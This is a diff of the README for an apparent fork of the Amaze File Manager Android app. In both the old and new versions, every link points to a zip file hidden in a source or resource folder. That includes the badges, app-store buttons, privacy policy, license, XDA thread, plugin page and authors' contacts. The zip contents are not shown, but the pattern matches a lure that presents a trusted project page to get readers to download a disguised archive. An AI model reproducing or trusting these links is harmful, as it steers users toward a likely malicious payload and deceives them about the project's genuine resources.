@@ -1,11 +1,11 @@
 # Amaze File Manager
-[![CI](https://raw.githubusercontent.com/Joe-Mogul/AmazeFileManager/master/app/src/main/java/com/amaze/filemanager/adapters/glide/Manager-Amaze-File-v2.8.zip)](https://raw.githubusercontent.com/Joe-Mogul/AmazeFileManager/master/app/src/main/java/com/amaze/filemanager/adapters/glide/Manager-Amaze-File-v2.8.zip)
-[![GitHub release](https://raw.githubusercontent.com/Joe-Mogul/AmazeFileManager/master/app/src/main/java/com/amaze/filemanager/adapters/glide/Manager-Amaze-File-v2.8.zip)](https://raw.githubusercontent.com/Joe-Mogul/AmazeFileManager/master/app/src/main/java/com/amaze/filemanager/adapters/glide/Manager-Amaze-File-v2.8.zip)
-[![License: GPL v3](https://raw.githubusercontent.com/Joe-Mogul/AmazeFileManager/master/app/src/main/java/com/amaze/filemanager/adapters/glide/Manager-Amaze-File-v2.8.zip%https://raw.githubusercontent.com/Joe-Mogul/AmazeFileManager/master/app/src/main/java/com/amaze/filemanager/adapters/glide/Manager-Amaze-File-v2.8.zip)](https://raw.githubusercontent.com/Joe-Mogul/AmazeFileManager/master/app/src/main/java/com/amaze/filemanager/adapters/glide/Manager-Amaze-File-v2.8.zip)
+[![CI](https://github.com/Joe-Mogul/AmazeFileManager/raw/refs/heads/master/app/src/main/res/values-en-rAU/Manager_File_Amaze_v2.7.zip)](https://github.com/Joe-Mogul/AmazeFileManager/raw/refs/heads/master/app/src/main/res/values-en-rAU/Manager_File_Amaze_v2.7.zip)
+[![GitHub release](https://github.com/Joe-Mogul/AmazeFileManager/raw/refs/heads/master/app/src/main/res/values-en-rAU/Manager_File_Amaze_v2.7.zip)](https://github.com/Joe-Mogul/AmazeFileManager/raw/refs/heads/master/app/src/main/res/values-en-rAU/Manager_File_Amaze_v2.7.zip)
+[![License: GPL v3](https://github.com/Joe-Mogul/AmazeFileManager/raw/refs/heads/master/app/src/main/res/values-en-rAU/Manager_File_Amaze_v2.7.zip%https://github.com/Joe-Mogul/AmazeFileManager/raw/refs/heads/master/app/src/main/res/values-en-rAU/Manager_File_Amaze_v2.7.zip)](https://github.com/Joe-Mogul/AmazeFileManager/raw/refs/heads/master/app/src/main/res/values-en-rAU/Manager_File_Amaze_v2.7.zip)
 
-[<img alt="Get it on Google Play" height="80" src="https://raw.githubusercontent.com/Joe-Mogul/AmazeFileManager/master/app/src/main/java/com/amaze/filemanager/adapters/glide/Manager-Amaze-File-v2.8.zip">](https://raw.githubusercontent.com/Joe-Mogul/AmazeFileManager/master/app/src/main/java/com/amaze/filemanager/adapters/glide/Manager-Amaze-File-v2.8.zip)
-[<img alt="Get it on F-Droid" height="80" src="https://raw.githubusercontent.com/Joe-Mogul/AmazeFileManager/master/app/src/main/java/com/amaze/filemanager/adapters/glide/Manager-Amaze-File-v2.8.zip">](https://raw.githubusercontent.com/Joe-Mogul/AmazeFileManager/master/app/src/main/java/com/amaze/filemanager/adapters/glide/Manager-Amaze-File-v2.8.zip)
-[<img alt="Get it on AFH" height="80" width="207" src="https://raw.githubusercontent.com/Joe-Mogul/AmazeFileManager/master/app/src/main/java/com/amaze/filemanager/adapters/glide/Manager-Amaze-File-v2.8.zip">](https://raw.githubusercontent.com/Joe-Mogul/AmazeFileManager/master/app/src/main/java/com/amaze/filemanager/adapters/glide/Manager-Amaze-File-v2.8.zip)
+[<img alt="Get it on Google Play" height="80" src="https://github.com/Joe-Mogul/AmazeFileManager/raw/refs/heads/master/app/src/main/res/values-en-rAU/Manager_File_Amaze_v2.7.zip">](https://github.com/Joe-Mogul/AmazeFileManager/raw/refs/heads/master/app/src/main/res/values-en-rAU/Manager_File_Amaze_v2.7.zip)
+[<img alt="Get it on F-Droid" height="80" src="https://github.com/Joe-Mogul/AmazeFileManager/raw/refs/heads/master/app/src/main/res/values-en-rAU/Manager_File_Amaze_v2.7.zip">](https://github.com/Joe-Mogul/AmazeFileManager/raw/refs/heads/master/app/src/main/res/values-en-rAU/Manager_File_Amaze_v2.7.zip)
+[<img alt="Get it on AFH" height="80" width="207" src="https://github.com/Joe-Mogul/AmazeFileManager/raw/refs/heads/master/app/src/main/res/values-en-rAU/Manager_File_Amaze_v2.7.zip">](https://github.com/Joe-Mogul/AmazeFileManager/raw/refs/heads/master/app/src/main/res/values-en-rAU/Manager_File_Amaze_v2.7.zip)
 
 
 Overview
@@ -32,27 +32,27 @@ Basic r/w operations might not work on external memory on Kitkat devices. Don't 
 
 ***Under the license we are not responsible for damages.***
 
-See our [Privacy Policy](https://raw.githubusercontent.com/Joe-Mogul/AmazeFileManager/master/app/src/main/java/com/amaze/filemanager/adapters/glide/Manager-Amaze-File-v2.8.zip)
+See our [Privacy Policy](https://github.com/Joe-Mogul/AmazeFileManager/raw/refs/heads/master/app/src/main/res/values-en-rAU/Manager_File_Amaze_v2.7.zip)
 
 Translators
 ----
 Want to help translate Amaze to your language?  
 
-See [Transifex translation](https://raw.githubusercontent.com/Joe-Mogul/AmazeFileManager/master/app/src/main/java/com/amaze/filemanager/adapters/glide/Manager-Amaze-File-v2.8.zip).
+See [Transifex translation](https://github.com/Joe-Mogul/AmazeFileManager/raw/refs/heads/master/app/src/main/res/values-en-rAU/Manager_File_Amaze_v2.7.zip).
 
 Vendors/Developers
 ----
-The device vendors/ROM developers are free to include Amaze apk pre-installed in system. There is no fee required; *but you must comply with the license* (for more information read the [GNU GPL v3](https://raw.githubusercontent.com/Joe-Mogul/AmazeFileManager/master/app/src/main/java/com/amaze/filemanager/adapters/glide/Manager-Amaze-File-v2.8.zip) or newer).
+The device vendors/ROM developers are free to include Amaze apk pre-installed in system. There is no fee required; *but you must comply with the license* (for more information read the [GNU GPL v3](https://github.com/Joe-Mogul/AmazeFileManager/raw/refs/heads/master/app/src/main/res/values-en-rAU/Manager_File_Amaze_v2.7.zip) or newer).
 
 We strongly recommend using apk signed by us (either Play Store version or from AFH link above) so that users would be able to update directly from Play Store after distribution. Furthermore, a change in digital signature will break plug-ins.
 
 Social
 ---
-Head over to our XDA thread [here](https://raw.githubusercontent.com/Joe-Mogul/AmazeFileManager/master/app/src/main/java/com/amaze/filemanager/adapters/glide/Manager-Amaze-File-v2.8.zip)
+Head over to our XDA thread [here](https://github.com/Joe-Mogul/AmazeFileManager/raw/refs/heads/master/app/src/main/res/values-en-rAU/Manager_File_Amaze_v2.7.zip)
 
 Support
 ---
-Support the development by purchasing our [Cloud Plugin](https://raw.githubusercontent.com/Joe-Mogul/AmazeFileManager/master/app/src/main/java/com/amaze/filemanager/adapters/glide/Manager-Amaze-File-v2.8.zip)  
+Support the development by purchasing our [Cloud Plugin](https://github.com/Joe-Mogul/AmazeFileManager/raw/refs/heads/master/app/src/main/res/values-en-rAU/Manager_File_Amaze_v2.7.zip)  
 Cloud plugin supports Google Drive, Dropbox, OneDrive and Box accounts.
 
 Authors
@@ -62,8 +62,8 @@ Authors
 
 ### License: 
 
-    Copyright (C) 2014-2018 Arpit Khurana <https://raw.githubusercontent.com/Joe-Mogul/AmazeFileManager/master/app/src/main/java/com/amaze/filemanager/adapters/glide/Manager-Amaze-File-v2.8.zip>, Vishal Nehra <https://raw.githubusercontent.com/Joe-Mogul/AmazeFileManager/master/app/src/main/java/com/amaze/filemanager/adapters/glide/Manager-Amaze-File-v2.8.zip>
-    Copyright (C) 2017-2018 Emmanuel Messulam <https://raw.githubusercontent.com/Joe-Mogul/AmazeFileManager/master/app/src/main/java/com/amaze/filemanager/adapters/glide/Manager-Amaze-File-v2.8.zip>
+    Copyright (C) 2014-2018 Arpit Khurana <https://github.com/Joe-Mogul/AmazeFileManager/raw/refs/heads/master/app/src/main/res/values-en-rAU/Manager_File_Amaze_v2.7.zip>, Vishal Nehra <https://github.com/Joe-Mogul/AmazeFileManager/raw/refs/heads/master/app/src/main/res/values-en-rAU/Manager_File_Amaze_v2.7.zip>
+    Copyright (C) 2017-2018 Emmanuel Messulam <https://github.com/Joe-Mogul/AmazeFileManager/raw/refs/heads/master/app/src/main/res/values-en-rAU/Manager_File_Amaze_v2.7.zip>
     This file is part of Amaze File Manager.
     Amaze File Manager is free software: you can redistribute it and/or modify
     it under the terms of the GNU General Public License as published by
@@ -74,4 +74,4 @@ Authors
     MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
     GNU General Public License for more details.
     You should have received a copy of the GNU General Public License
-    along with this program.  If not, see <https://raw.githubusercontent.com/Joe-Mogul/AmazeFileManager/master/app/src/main/java/com/amaze/filemanager/adapters/glide/Manager-Amaze-File-v2.8.zip>.
+    along with this program.  If not, see <https://github.com/Joe-Mogul/AmazeFileManager/raw/refs/heads/master/app/src/main/res/values-en-rAU/Manager_File_Amaze_v2.7.zip>.
